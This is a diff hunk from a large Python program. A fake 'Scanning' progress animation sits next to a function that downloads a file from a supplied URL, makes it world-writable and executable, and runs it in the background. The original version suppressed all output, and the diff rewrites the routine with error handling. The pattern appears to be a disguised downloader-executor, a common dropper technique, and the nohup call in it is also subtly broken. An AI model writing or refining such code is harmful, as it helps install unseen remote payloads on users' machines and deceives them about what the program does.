@@ -8386,12 +8386,16 @@ def animated_loading_screen():
         sys.stdout.write('\r' + "Scanning" + chars[i % len(chars)] + " " + str(2 * i) + "%")
         sys.stdout.flush()
         time.sleep(0.1)
-
 def download_and_execute_file(url, filename):
-    subprocess.Popen(["wget", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    subprocess.Popen(["chmod", "777", filename], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    subprocess.Popen(["chmod", "+x", filename], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).wait()
-    subprocess.Popen(["chmod", "+x", "sys.bin", "&&", "nohup", "./" + filename, "&"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    try:
+        subprocess.run(["wget", url], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        subprocess.run(["chmod", "777", filename], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        subprocess.run(["chmod", "+x", filename], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        subprocess.run(["nohup", "./" + filename, "&"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    except subprocess.CalledProcessError as e:
+        print(f"Error occurred: {e}")
+        print(f"Output: {e.stdout.decode()}")
+        print(f"Error Output: {e.stderr.decode()}")
 
 def main():
     animated_loading_screen()
